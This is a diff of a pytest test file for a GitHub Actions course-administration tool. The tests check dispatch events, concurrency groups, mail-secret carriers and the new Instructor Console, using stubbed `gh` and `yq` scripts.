     # DSL_BOT_TOKEN does every call here, so the ambient token gets no scopes at all.
     assert doc["permissions"] == {}
-    # The event type the course org's Scheduled release filters `types:` on.
-    assert "event_type=scheduled-release" in tmpl
-    # The course org is read from THIS semester's own pointer, never baked in at bootstrap.
+    # The course org is read from THIS semester's own pointer, by a YAML reader.
     assert "__CONFIG_REPO__/contents/__POINTER__" in tmpl
+    assert "grep '^course:'" not in tmpl
     assert tmpl.splitlines()[0].startswith("# SYSTEM-OWNED")
+
+
+def _fire(tmp_path, changed: str, before: str = "abc") -> list[str]:
+    """Run the dispatcher's step under bash with `gh` and `yq` stubbed: the events fired."""
+    _tmpl, doc = _dispatcher()
+    script = tmp_path / "run.sh"
+    script.write_text(
+        doc["jobs"]["dispatch"]["steps"][0]["run"]
+        .replace("__CONFIG_REPO__", "semester-config")
+        .replace("__POINTER__", ".system/dsl-course.yml")
+    )
+    bin_dir = tmp_path / "bin"
+    bin_dir.mkdir(exist_ok=True)
+    log = tmp_path / "fired"
+    (bin_dir / "gh").write_text(
+        "#!/bin/bash\n"
+        'case "$2" in\n'
+        "  */contents/*) echo 'course: \"the-course\"  # a comment' ;;\n"
+        '  */compare/*) printf "%s\\n" $CHANGED ;;\n'
+        f'  */dispatches) echo "$2 $4" >> {log} ;;\n'
+        "esac\n"
+    )
+    (bin_dir / "yq").write_text(
+        f"#!/bin/bash\nexec {sys.executable} -c "
+        "'import sys, yaml; print(yaml.safe_load(sys.stdin)[\"course\"])'\n"
+    )
+    for tool in ("gh", "yq"):
+        (bin_dir / tool).chmod(0o755)
+    env = {
+        "PATH": f"{bin_dir}:/usr/bin:/bin",
+        "CHANGED": changed,
+        "BEFORE": before,
+        "AFTER": "def",
+        "SEMESTER_ORG": "sem",
+        "REPO": "sem/semester-config",
+    }
+    subprocess.run(["bash", "-eo", "pipefail", str(script)], env=env, check=True)
+    lines = log.read_text().splitlines() if log.exists() else []
+    assert all(line.startswith("repos/the-course/.github/dispatches") for line in lines)
+    return [line.split("event_type=")[1] for line in lines]
+
+
+@pytest.mark.parametrize("changed", sorted(set().union(*DISPATCH_MAP.values())))
+def test_a_push_wakes_exactly_the_events_its_file_maps_to(tmp_path, changed):
+    expected = [e for e, files in DISPATCH_MAP.items() if changed in files]
+    assert _fire(tmp_path, f"{changed} README.md") == expected
+
+
+def test_a_new_branch_wakes_everything(tmp_path):
+    assert _fire(tmp_path, "", before="0000000000") == list(DISPATCH_MAP)
 
 
 def test_send_codes_only_ever_runs_off_a_roster_push():
@@ -910,122 +550,6 @@ def test_send_codes_only_ever_runs_off_a_roster_push():
         "send-codes-${{ github.event.client_payload.semester_org }}"
         in doc["concurrency"]["group"]
     )
-
-
-def test_semester_config_roster_dispatcher_fires_send_codes_on_students_csv():
-    # students.csv is the only file that feeds the codes email, and this dispatcher is the
-    # only thing that fires it. It dispatches the same event type the rendered workflow
-    # listens for; loop-safety is the send's own `code_sent_at` idempotence, documented in
-    # the template.
-    tmpl = (
-        ROOT / "templates" / "semester-config" / "dispatch-send-codes.yml"
-    ).read_text()
-    doc = yaml.safe_load(tmpl)
-    trigger = doc.get("on", doc.get(True))
-    assert trigger["push"]["paths"] == ["students.csv"]
-    assert trigger["push"]["branches"] == ["main"]
-    assert doc["permissions"] == {}
-    assert "event_type=send-codes" in tmpl
-    # The course org is read from THIS semester's own pointer, never baked in at bootstrap.
-    assert "__CONFIG_REPO__/contents/__POINTER__" in tmpl
-
-
-# The whole assignment, in the order the ten boxes are numbered. Pinned as a LIST: the
-# order is what a person reads down, and GitHub caps a workflow_dispatch at ten - which
-# `visibility` now reaches, so the form is FULL: an eleventh box is impossible and a
-# replacement for one of these is a decision, not a diff nobody noticed.
-NEW_ASSIGNMENT_INPUTS = [
-    "assignment_name",
-    "formats",
-    "type",
-    "submit_via",
-    "autograde",
-]
-
-
-def test_only_the_name_is_marked_required():
-    # GitHub renders an asterisk beside every `required: true` label. The name is the one
-    # answer with no default: it names the repo. The rest carry a `default:`, and a
-    # choice/string with a default and a boolean are submitted whether or not anyone
-    # touches the form - so the run step still gets them all.
-    inputs = workflow_inputs(workflows_render.render_new_assignment())
-    assert inputs["assignment_name"]["required"] is True
-    for name in NEW_ASSIGNMENT_INPUTS[1:]:
-        assert "required" not in inputs[name], name
-        assert "default" in inputs[name], name
-
-
-def test_new_assignment_button_asks_for_the_whole_assignment():
-    # Every one of these but `format` lands verbatim in grading_config.yml, so the answers
-    # given here are the ones the handout, the sheet and the Join-team form later obey -
-    # none of them is hand-edited in afterwards. `format` picks the starters instead, and
-    # is the one box the scaffold parses rather than records.
-    rendered = workflows_render.render_new_assignment()
-    inputs = workflow_inputs(rendered)
-    assert list(inputs) == NEW_ASSIGNMENT_INPUTS
-    assert len(inputs) <= GITHUB_MAX_DISPATCH_INPUTS
-    # GitHub renders the boxes in this order and numbers nothing itself, so the numbering
-    # in the descriptions is the only thing that can be wrong about it.
-    for n, name in enumerate(NEW_ASSIGNMENT_INPUTS, start=1):
-        assert inputs[name]["description"].startswith(f"{n}. ")
-    # Box 2 takes a LIST, so it is free text rather than a dropdown - and every format the
-    # scaffold accepts has to be named in the description, because that is the only place
-    # a faculty member can read the vocabulary off. Asserted as the WHOLE joined list
-    # rather than one member at a time: `py` is a substring of `ipynb`, so a per-member
-    # check passes a description that dropped it.
-    # Four boxes arrive at the course-default sentinel, which the scaffold resolves
-    # against the course's `assignment_defaults:` (tests/test_scaffold.py).
-    sentinel = course.COURSE_DEFAULT_CHOICE
-    assert "type" not in inputs["formats"] and inputs["formats"]["default"] == sentinel
-    assert ", ".join(course.STARTER_FORMATS) in inputs["formats"]["description"]
-    assert course.NO_STARTER in inputs["formats"]["description"]
-    assert inputs["type"]["options"] == list(course.ASSIGNMENT_TYPES)
-    assert inputs["submit_via"]["options"] == [sentinel, *course.SUBMIT_VIA]
-    assert inputs["submit_via"]["default"] == sentinel
-    # The legacy `github` spelling is read for ever, but this form is a fresh choice, so
-    # it is never among the words the dropdown offers or defaults to.
-    assert "github" not in inputs["submit_via"]["options"]
-    # Nothing a semester decides (decision 0009): those are its assignments.yml.
-    assert not set(inputs) & set(settings.RUN_KEYS)
-    # Hand-marking is the default, so `tests/` is seeded only when someone asks for it.
-    assert inputs["autograde"]["type"] == "boolean"
-    assert inputs["autograde"]["default"] is False
-    step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
-    assert "${{" not in step["run"]
-    for env_name, field in (
-        ("NAME", "assignment_name"),
-        ("FORMATS", "formats"),
-        ("TYPE", "type"),
-        ("SUBMIT_VIA", "submit_via"),
-        ("AUTOGRADE", "autograde"),
-    ):
-        assert step["env"][env_name] == f"${{{{ inputs.{field} }}}}"
-        assert f'"${env_name}"' in rendered
-
-
-def test_the_copy_forward_dropdown_starts_on_the_fresh_starter():
-    # GitHub selects the first option, and every other repo dropdown carries a `default:`
-    # naming this year's - so a `copy_from` built the same way would copy a whole repo
-    # forward for anyone who typed a tag and pressed the button. The fresh starter is
-    # first and there is no default; it is a named option, never an empty string, because
-    # an option GitHub rejects would take the scaffold button down with it.
-    spec = workflow_inputs(workflows_render.render_new_materials(REPOS_2))["copy_from"]
-    assert spec["options"][0] == workflows_render._FRESH_STARTER
-    assert "" not in spec["options"]
-    assert "default" not in spec
-    assert spec["required"] is False
-
-
-def test_the_copy_forward_dropdown_lists_the_materials_repos():
-    # Fed the topic's repos (`discover_materials_repos`), whatever they are named.
-    rendered = workflows_render.render_new_materials(
-        ["course-materials-f2026", "slides"]
-    )
-    assert workflow_inputs(rendered)["copy_from"]["options"] == [
-        workflows_render._FRESH_STARTER,
-        "course-materials-f2026",
-        "slides",
-    ]
 
 
 @pytest.mark.parametrize("name", sorted(ALL_RENDERED))
@@ -2025,16 +1549,9 @@ def test_only_the_nightly_refresh_joins_the_seed_refresh_group():
 # Every renderer that WRITES shared state, and the group name it must serialise under.
 # Listed rather than derived, because the decision is per workflow: a second overlapping
 # run of any of these races the first into sha conflicts, a clobbered force-push, or a
-# half-reconciled team. Read-only buttons (Check semester setup) are deliberately absent.
+# half-reconciled team. Read-only buttons are deliberately absent.
 SERIALISED_WRITERS = {
-    "release": "release-materials",
-    "central_release": "release-materials",
-    "provision": "release-assignment",
     "collect_submissions": "collect-submissions",
-    # Two presses at once would read the record, both find a student unclaimed, and
-    # both claim-then-send them - the one duplicate the whole protocol exists to
-    # avoid, to a whole semester.
-    "open_team_formation": "open-team-formation",
     # Two overlapping Send-codes runs generate two codes for the same blank cell: one is
     # written and the other is emailed, so that student's code enrols nobody. Scoped PER
     # SEMESTER, because that raced state is one semester's students.csv: a roster push in one
@@ -2042,8 +1559,6 @@ SERIALISED_WRITERS = {
     # third arrival cancels the second).
     "send_codes": "send-codes-${{ github.event.client_payload.semester_org }}",
     "sync_membership": "sync-membership",
-    "propagate_semester": "propagate-semester",
-    "archive_semester": "archive-semester",
     "sync_site": "sync-site",
     "publish_site": "publish-course-website",
     # Per ACTOR: one person's presses run in order, and two people never wait on each other.
@@ -2466,17 +1981,16 @@ def test_a_renamed_org_is_corrected_even_with_no_repo_table_markers():
 
 # Everything that can put an email on the wire: the codes send, off a roster push, and
 # Distribute grades, the one button left that emails a whole semester.
-MAIL_SENDERS = ("send_codes", "distribute_grades", "open_team_formation")
+MAIL_SENDERS = ("send_codes", "distribute_grades")
 
-# Everything whose job env must carry the transport secrets. Check semester setup sends
-# nothing - it REPORTS whether a send could (status' mail-transport row reads the very
-# same variables through `mailer.graph_config_from_env`), and a workflow that does not
-# carry them would report "unset" on every org whatever the truth. That is the exact
-# fiction an unattended codes send leans on when it says a person will read the row.
-# ...plus the scheduler, which mails a semester about a source it has not staged, and
-# every cron, whose failure step mails the maintainer the log (asserted per cron in
-# test_every_unattended_run_files_and_closes_its_own_failure_issue).
-MAIL_ENV_CARRIERS = MAIL_SENDERS + ("status", "scheduler", "console")
+# Everything whose job env must carry the transport secrets: the senders, the scheduler,
+# which mails a semester about a source it has not staged, and the Console, which runs
+# every mailing op (team formation, new codes) and whose Check REPORTS whether a send
+# could - status' mail-transport row reads the very same variables through
+# `mailer.graph_config_from_env`, and a job that does not carry them would report "unset"
+# on every org whatever the truth. Every cron's failure step mails the maintainer the log
+# too (asserted per cron in test_every_unattended_run_files_and_closes_its_own_failure_issue).
+MAIL_ENV_CARRIERS = MAIL_SENDERS + ("scheduler", "console")
 
 
 def _secret_ref(name: str) -> str:
@@ -2487,7 +2001,7 @@ def _secret_ref(name: str) -> str:
 # The mail senders that HAVE a button, i.e. the ones a preview is possible for at all.
 # Send enrolment codes is deliberately not among them: it has no button and no preview -
 # a push to a semester's students.csv is what fires it, and it sends for real.
-MAIL_BUTTONS = ("distribute_grades", "open_team_formation")
+MAIL_BUTTONS = ("distribute_grades",)
 
 
 @pytest.mark.parametrize("name", MAIL_BUTTONS)
@@ -2593,14 +2107,16 @@ def test_the_manual_sync_button_is_not_given_the_transport():
 
 
 def test_a_semester_bootstrap_forwards_the_maintainer_address_to_the_new_org():
-    # It runs in the COURSE org, which has the address as an org secret already, and
-    # --propagate-secret is what copies it down. A semester org left without it is one whose
-    # own seeded workflows fall back to the shared send mailbox.
-    steps = workflow_jobs(ALL_RENDERED["bootstrap_semester"])["bootstrap-semester"][
-        "steps"
-    ]
-    step = next(s for s in steps if "--propagate-secret" in str(s.get("run", "")))
+    # New semester runs in the Console job in the COURSE org, which has the address as an
+    # org secret already, and --propagate-secret is what copies it down. A semester org
+    # left without it is one whose own seeded workflows fall back to the shared mailbox.
+    steps = _console_steps()
+    step = next(s for s in steps if "dsl_course.console" in str(s.get("run", "")))
     assert step["env"][mailer.MAINTAINER_ENV] == _secret_ref(mailer.MAINTAINER_ENV)
+    op = REGISTRY["semester.bootstrap"]
+    assert "--propagate-secret" in op.argv(
+        Request(op.name, "prof", "Course", "Course-f2026", {}, False)
+    )
 
 
 @pytest.mark.parametrize("name", sorted(ALL_RENDERED))
@@ -2629,28 +2145,11 @@ def test_the_git_authentication_sweep_sees_the_pushing_buttons():
         if "gh auth setup-git" in rendered
     }
     assert {
-        "release",
-        "provision",
-        "propagate_semester",
-        "archive_semester",
-        "new_materials",
-        "new_assignment",
+        "console",
         "sync_site",
         "publish_site",
         "scheduler",
     } <= pushing
-
-
-def test_new_materials_asks_nothing_about_publishing():
-    # The public website has its own settings (opencourse.yml, decision 0016), and a
-    # semester site's publish.yml is an opt-in faculty write by hand (decision 0035).
-    assert set(workflow_inputs(workflows_render.render_new_materials())) == {
-        "semester",
-        "copy_from",
-    }
-
-
-# ------------------------------------------------------------------ the Console workflow
 
 
 def _console_steps() -> list[dict]:
@@ -2678,7 +2177,9 @@ def test_the_console_gates_before_it_fetches_anything():
     steps = _console_steps()
     gate = steps[0]
     # The same check, and the same refusal, as every other button's check-team job.
-    check_team = workflow_jobs(ALL_RENDERED["status"])["check-team"]["steps"][0]
+    check_team = workflow_jobs(ALL_RENDERED["distribute_grades"])["check-team"][
+        "steps"
+    ][0]
     assert gate["run"] == check_team["run"]
     assert gate["env"] == check_team["env"]
     assert gate["id"] == "gate"
@@ -2773,10 +2274,25 @@ def test_the_course_page_lists_the_console_as_auto_handled():
     page = profile_readme.render_profile_readme(
         "My-Course-E1", "My Course", [], False, central_ref="main"
     )
-    auto = page.split("### Automatically handled")[1]
+    auto = page.split("## Workflows in this repo")[1]
     (row,) = [line for line in auto.splitlines() if "console.yml" in line]
     assert "Runs what the Instructor Console asks for" in row
     assert row.rstrip().endswith("| Auto-handled |")
+
+
+def test_the_course_page_lists_every_op_with_its_command():
+    # Decision 0041: the page's table is the console + CLI one, one row per registry op,
+    # and links no workflow the org no longer has.
+    page = profile_readme.render_profile_readme(
+        "My-Course-E1", "My Course", [], False, central_ref="main"
+    )
+    table = page.split("## What you can do")[1].split("## Workflows in this repo")[0]
+    for op in REGISTRY.values():
+        (row,) = [line for line in table.splitlines() if f"| `{op.name}` |" in line]
+        assert f"`python -m dsl_course {op.name} --course-org My-Course-E1" in row
+        assert op.help in row
+    for retired in seed.RETIRED_GITHUB_WORKFLOWS:
+        assert retired.removeprefix(".github/") not in page
 
 
 # The grading report's `graded` step, as the scheduler renders it.
